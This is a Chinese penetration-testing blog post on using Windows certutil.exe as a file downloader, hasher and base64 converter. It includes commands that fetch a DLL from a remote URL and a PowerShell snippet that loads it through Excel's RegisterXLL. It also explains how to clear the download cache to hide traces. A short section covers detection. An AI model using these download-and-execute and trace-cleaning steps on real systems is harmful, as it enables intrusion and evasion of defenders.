---
layout: post
title: 渗透测试中的certutil
---

---


## 0x00 前言
---

最近在Casey Smith‏ @subTee的twitter上学到了关于certutil的一些利用技巧。本文将结合自己的一些经验，介绍certutil在渗透测试中的应用，对cmd下downloader的实现方法作补充，总结base64编码转换的常用方法。

**学习地址：**

https://twitter.com/subTee/status/888101536475344896

https://twitter.com/subTee/status/888071631528235010


## 0x01 简介
---

本文将要介绍以下内容：

- certutil.exe在渗透测试中的应用
- downloader常用方法
- base64编码转换常用方法

## 0x02 certutil简介
---

用于证书管理

支持xp-win10

更多操作说明见https://technet.microsoft.com/zh-cn/library/cc755341(v=ws.10).aspx

**注：**

在之前的文章《域渗透——EFS文件解密》有用过certutil.exe导入证书

## 0x03 渗透测试中的应用
---

### 1、downloader

(1) 保存在当前路径，文件名称同URL

eg：

`certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt`

(2) 保存在当前路径，指定保存文件名称

eg：

`certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt file.txt`

(3) 保存在缓存目录，名称随机

缓存目录位置： `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`

eg：

`certutil.exe -urlcache -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt`

(4) 支持保存二进制文件

eg：

`certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll`

**注：**

使用downloader默认在缓存目录位置： `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`保存下载的文件副本

**清除下载文件副本方法：**

**方法1：** 直接删除缓存目录对应文件

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-26/2-1.png)

**方法2：** 命令行:

`certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete`

**补充：**

查看缓存项目：

`certutil.exe -urlcache *`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-26/2-2.png)

**实际测试：**

测试系统安装Office软件，下载执行dll对应的powershell代码如下：

```
$path="c:\test\msg1.dll"
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll $path
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
$excel.RegisterXLL($path)
```

测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-26/2-3.png)


### 2、计算文件hash

(1) SHA1

`certutil.exe -hashfile msg.dll`

(2) SHA256：

`certutil.exe -hashfile msg.dll SHA256`

(3) MD5：

`certutil.exe -hashfile msg.dll MD5`

### 3、base64编码转换

(1) base64编码：

`CertUtil -encode InFile OutFile`

(2) base64解码

`CertUtil -decode InFile OutFile`

**注：**

编码后的文件会添加两处标识信息：

文件头：

`-----BEGIN CERTIFICATE-----`

文件尾：

`-----END CERTIFICATE-----`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-26/2-4.png)


## 0x04 downloader常用方法
---

在之前的文章《渗透技巧——通过cmd上传文件的N种方法》整理过常用的cmd下downloader方法，相比来说，利用certUtil简便快捷，但是使用后需要注意清除缓存，路径如下：

`%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`

downloader常用方法如下：

- certUtil
- powershell
- csc
- vbs
- JScript
- hta
- bitsadmin
- wget
- debug
- ftp
- ftfp

## 0x05 base64编码转换常用方法
---

在编写脚本操作二进制文件时，常常会因为不可见字符报错，所以通常会选择先对二进制文件作base64编码再操作，最后通过解码还原出二进制文件。

所以在此整理一下常用不同开发工具对应的base64编码转换方式

### 1、powershell

base64编码：

```
$PEBytes = [System.IO.File]::ReadAllBytes("C:\windows\system32\calc.exe")
$Base64Payload = [System.Convert]::ToBase64String($PEBytes)
Set-Content base64.txt -Value $Base64Payload
```

base64解码：

```
$Base64Bytes = Get-Content ("base64.txt")
$PEBytes= [System.Convert]::FromBase64String($Base64Bytes)
[System.IO.File]::WriteAllBytes("calc.exe",$PEBytes)
```

### 2、C SHARP（c#）

base64编码：

```
using System.IO;

byte[] AsBytes = File.ReadAllBytes(@"C:\windows\system32\calc.exe");
String AsBase64String = Convert.ToBase64String(AsBytes);
StreamWriter sw = new StreamWriter(@"C:\test\base64.txt");
sw.Write(AsBase64String);
sw.Close();
```

base64解码：

```
using System.IO;

String AsString = File.ReadAllText(@"C:\test\base64.txt");
byte[] bytes = Convert.FromBase64String(AsString);          
FileStream fs = new FileStream(@"C:\test\calc.exe", FileMode.Create);
fs.Write(bytes, 0, bytes.Length);
fs.Flush();
fs.Close();
```

**注：**

在之前的文章《渗透技巧——通过cmd上传文件的N种方法》存在两处bug

> “ 解密base64文件并生成exe的方法： ”

其中的powershell代码和c#代码存在bug，修正的代码以本文为准

### 3、js

base64解码：

```
fso1=new ActiveXObject("Scripting.FileSystemObject");
f=fso1.OpenTextFile("C:\\test\\base64.txt",1);
base64string=f.ReadAll();
f.Close();
enc = new ActiveXObject("System.Text.ASCIIEncoding");
length = enc.GetByteCount_2(base64string);
ba = enc.GetBytes_4(base64string);
transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
ba = transform.TransformFinalBlock(ba, 0, length);
s=new ActiveXObject("ADODB.Stream");
s.Type=1;
s.Open();
s.Write(ba);	
s.SaveToFile("C:\\test\\calc.exe",2);
```

### 4、certutil

base64编码：

```
CertUtil -encode InFile OutFile
```

base64解码：

```
CertUtil -decode InFile OutFile
```

**注：**

编码后的文件会添加两处标识信息：

文件头：

-----BEGIN CERTIFICATE-----

文件尾：

-----END CERTIFICATE-----

## 0x06 检测downloader
---

查看利用certUtil下载文件的缓存记录：

`certutil.exe -urlcache *`

缓存文件位置：

`%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`

## 0x07 小结
---

本文介绍了certutil在渗透测试中的应用，详细介绍利用certutil作downloader的实现方法和检测方法，最后总结了base64编码转换的常用方法。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



